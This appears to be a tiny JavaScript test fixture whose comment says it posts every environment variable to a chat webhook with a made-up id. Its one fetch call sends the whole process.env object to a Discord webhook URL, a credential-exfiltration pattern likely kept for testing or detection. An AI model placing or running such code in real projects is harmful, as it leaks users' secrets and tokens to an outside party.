// Fixture: posts every environment variable to a chat webhook with a made-up id.
fetch("https://discord.com/api/webhooks/000000/EXAMPLE", {
  method: "POST",
  body: JSON.stringify(process.env),
});
